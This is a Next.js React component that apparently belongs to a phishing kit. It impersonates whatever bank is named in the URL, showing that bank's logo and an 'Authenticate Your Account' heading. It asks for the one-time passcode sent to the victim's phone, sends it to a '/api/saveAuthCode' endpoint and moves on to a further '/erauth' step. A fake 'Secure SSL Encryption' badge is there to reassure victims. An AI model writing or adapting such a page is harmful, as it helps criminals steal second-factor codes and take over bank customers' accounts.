"use client"

import { useState, useEffect } from 'react'
import { useSearchParams, useRouter } from 'next/navigation'
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { Lock, Loader2 } from "lucide-react"

export default function AuthContent() {
  const router = useRouter()
  const [bankName, setBankName] = useState('')
  const [bankLogo, setBankLogo] = useState('')
  const [authCode, setAuthCode] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const searchParams = useSearchParams()

  useEffect(() => {
    const bank = searchParams.get('bank')
    if (bank) {
      const decodedBankName = decodeURIComponent(bank)
      setBankName(decodedBankName)
      setBankLogo(`/bank-logos/${decodedBankName.toLowerCase().split(' ')[0]}.png`)
    }
  }, [searchParams])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    try {
      const response = await fetch('/api/saveAuthCode', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          authCode,
          bank: bankName,
        }),
      })

      if (response.ok) {
        router.push(`/erauth?bank=${encodeURIComponent(bankName)}`)
      } else {
        throw new Error('Failed to save authentication code')
      }
    } catch (error) {
      console.error('Error saving authentication code:', error)
      alert('An error occurred while saving your authentication code. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className={`min-h-screen flex flex-col ${isLoading ? 'blur-sm' : ''}`}>
      <main className="flex-grow container mx-auto px-4 py-8 relative">
        {isLoading && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <Loader2 className="w-8 h-8 text-white animate-spin" />
          </div>
        )}
        <Card className="w-full max-w-md md:max-w-lg lg:max-w-xl xl:max-w-2xl mx-auto rounded-lg shadow-lg overflow-hidden bg-white">
          <CardContent className="p-6 md:p-8">
            <Image
              src={bankLogo}
              alt={`${bankName} Logo`}
              width={50}
              height={50}
              className="mb-8 mx-auto"
            />
            <h2 className="text-lg md:text-xl lg:text-2xl font-bold text-center mb-2 text-black">
              Authenticate Your {bankName} Account
            </h2>
            <p className="text-sm md:text-base lg:text-lg text-center mb-6 text-black">
              Enter the OTP sent to your phone number
            </p>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Label htmlFor="authCode" className="font-bold text-black">OTP:</Label>
                <Input 
                  id="authCode" 
                  type="text" 
                  placeholder="Enter your authentication code" 
                  required 
                  className="text-black bg-gray-100"
                  value={authCode}
                  onChange={(e) => setAuthCode(e.target.value)}
                />
              </div>
              <Button 
                type="submit" 
                className="w-full bg-[#022d2d] hover:bg-[#033e3e] text-white font-bold"
                disabled={isLoading}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Submitting...
                  </>
                ) : (
                  'Authenticate'
                )}
              </Button>
            </form>
            <div className="flex items-center justify-center mt-6 text-black">
              <Lock className="w-4 h-4 mr-2" />
              <span className="text-sm md:text-base">Secure SSL Encryption</span>
            </div>
          </CardContent>
        </Card>
      </main>
    </div>
  )
}